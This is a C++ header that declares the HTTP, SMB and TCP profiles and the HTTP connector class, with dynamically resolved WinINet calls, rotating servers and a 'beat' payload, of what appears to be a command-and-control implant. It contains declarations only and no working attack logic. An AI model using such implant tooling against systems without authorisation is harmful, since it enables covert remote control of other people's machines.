#pragma once

#include <windows.h>
#include <wininet.h>

#ifndef PROFILE_STRUCT
#define PROFILE_STRUCT
typedef struct {
	ULONG  servers_count;
	BYTE** servers;
	WORD*  ports;
	BOOL   use_ssl;
	BYTE*  http_method;
	BYTE*  uri;
	BYTE*  parameter;
	BYTE*  user_agent;
	BYTE*  http_headers;
	ULONG  ans_pre_size;
	ULONG  ans_size;
} ProfileHTTP;

typedef struct {
	BYTE* pipename;
} ProfileSMB;

typedef struct {
	BYTE* prepend;
	WORD  port;
} ProfileTCP;
#endif

#define DECL_API(x) decltype(x) * x

struct HTTPFUNC {
	DECL_API(LocalAlloc);
	DECL_API(LocalReAlloc);
	DECL_API(LocalFree);
	DECL_API(LoadLibraryA);
	DECL_API(GetProcAddress);
	DECL_API(GetLastError);

	DECL_API(InternetOpenA);
	DECL_API(InternetConnectA);
	DECL_API(HttpOpenRequestA);
	DECL_API(HttpSendRequestA);
	DECL_API(InternetSetOptionA);
	DECL_API(InternetQueryOptionA);
	DECL_API(HttpQueryInfoA);
	DECL_API(InternetQueryDataAvailable);
	DECL_API(InternetCloseHandle);
	DECL_API(InternetReadFile);
};

class ConnectorHTTP
{
	CHAR*  user_agent     = NULL;
	CHAR*  host_header	  = NULL;
	BOOL   ssl			  = FALSE;
	CHAR*  http_method    = NULL;
	ULONG  server_count   = 0;
	CHAR** server_address = NULL;
	WORD*  server_ports   = 0;
	CHAR*  uri            = NULL;
	CHAR*  headers        = NULL;
	ULONG  ans_size       = 0;
	ULONG  ans_pre_size   = 0;

	BYTE* recvData = NULL;
	int   recvSize = 0;

	HTTPFUNC* functions = NULL;

	HINTERNET hInternet = NULL;
	HINTERNET hConnect  = NULL;

	ULONG server_index = 0;

public:
	ConnectorHTTP();

	BOOL SetConfig(ProfileHTTP profile, BYTE* beat, ULONG beatSize);
	void CloseConnector();

	void  SendData(BYTE* data, ULONG data_size);
	BYTE* RecvData();
	int   RecvSize();
	void  RecvClear();
};